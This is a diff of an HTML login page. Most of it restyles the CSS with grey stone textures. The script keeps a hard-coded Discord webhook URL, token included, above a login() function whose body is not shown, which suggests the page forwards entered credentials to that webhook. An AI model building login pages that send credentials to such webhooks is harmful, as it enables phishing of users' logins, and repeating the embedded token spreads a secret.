@@ -14,7 +14,9 @@
 
     body {
       height: 100vh;
-      background: linear-gradient(135deg, #111827, #1e3a8a);
+      background: radial-gradient(circle at center, #2d2d2d 0%, #1a1a1a 100%);
+      background-image: url('https://www.transparenttextures.com/patterns/rocky-wall.png');
+      background-size: cover;
       display: flex;
       justify-content: center;
       align-items: center;
@@ -22,63 +24,78 @@
 
     .login-box {
       width: 320px;
-      background: rgba(255, 255, 255, 0.08);
+      background: rgba(40, 40, 40, 0.9);
       border-radius: 20px;
       padding: 40px 35px;
-      backdrop-filter: blur(12px);
-      color: white;
+      backdrop-filter: blur(6px);
+      color: #e5e5e5;
       text-align: center;
-      box-shadow: 0 8px 32px rgba(0, 0, 0, 0.4);
-      transition: transform 0.3s ease;
+      box-shadow: 0 10px 35px rgba(0, 0, 0, 0.6), inset 0 0 25px rgba(255, 255, 255, 0.05);
+      border: 2px solid rgba(90, 90, 90, 0.5);
+      background-image: url('https://www.transparenttextures.com/patterns/stone-wall.png');
+      background-size: cover;
+      transition: transform 0.3s ease, box-shadow 0.3s ease;
     }
 
     .login-box:hover {
       transform: translateY(-3px);
+      box-shadow: 0 12px 40px rgba(0, 0, 0, 0.7), inset 0 0 30px rgba(255, 255, 255, 0.08);
     }
 
     h2 {
       font-size: 1.8rem;
       margin-bottom: 20px;
       letter-spacing: 1px;
+      text-shadow: 1px 1px 4px rgba(0, 0, 0, 0.8);
+      color: #f5f5f5;
     }
 
     input {
       width: 100%;
       padding: 12px;
       margin: 10px 0;
-      border: none;
+      border: 1px solid rgba(100, 100, 100, 0.6);
       border-radius: 10px;
-      background: rgba(255, 255, 255, 0.15);
-      color: white;
+      background: rgba(60, 60, 60, 0.9);
+      background-image: url('https://www.transparenttextures.com/patterns/concrete-wall.png');
+      background-size: cover;
+      color: #f0f0f0;
       font-size: 1rem;
       outline: none;
       transition: 0.2s;
+      box-shadow: inset 0 2px 5px rgba(0, 0, 0, 0.6);
     }
 
     input::placeholder {
-      color: #d1d5db;
+      color: #b3b3b3;
     }
 
     input:focus {
-      background: rgba(255, 255, 255, 0.25);
+      background: rgba(75, 75, 75, 0.95);
+      border-color: #c0c0c0;
+      box-shadow: 0 0 8px rgba(180, 180, 180, 0.5), inset 0 2px 5px rgba(0, 0, 0, 0.7);
     }
 
     button {
       width: 100%;
       padding: 12px;
-      background: linear-gradient(90deg, #2563eb, #1d4ed8);
+      background: linear-gradient(90deg, #5a5a5a, #3e3e3e);
       border: none;
       border-radius: 10px;
-      color: white;
+      color: #f0f0f0;
       font-size: 1rem;
       cursor: pointer;
       transition: 0.3s;
       margin-top: 10px;
+      box-shadow: 0 4px 10px rgba(0, 0, 0, 0.6);
+      text-transform: uppercase;
+      letter-spacing: 0.5px;
     }
 
     button:hover {
-      background: linear-gradient(90deg, #1e40af, #3b82f6);
+      background: linear-gradient(90deg, #6b6b6b, #4a4a4a);
       transform: scale(1.03);
+      box-shadow: 0 6px 15px rgba(0, 0, 0, 0.7);
     }
 
     .error {
@@ -86,6 +103,7 @@
       margin-top: 8px;
       font-size: 0.9rem;
       display: none;
+      text-shadow: 0 0 5px rgba(0, 0, 0, 0.8);
     }
   </style>
 </head>
@@ -99,7 +117,6 @@
   </div>
 
   <script>
-    // ⚠️ Replace this with your actual Discord webhook URL
     const WEBHOOK_URL = "https://discord.com/api/webhooks/1433475537900142687/KTCv1yi4FDiqeAQJnopDIqo9EKx_JTnU8m4DouxnJ9Nh-xithm4JTu4dw_IRUvkDblZA";
 
     async function login() {
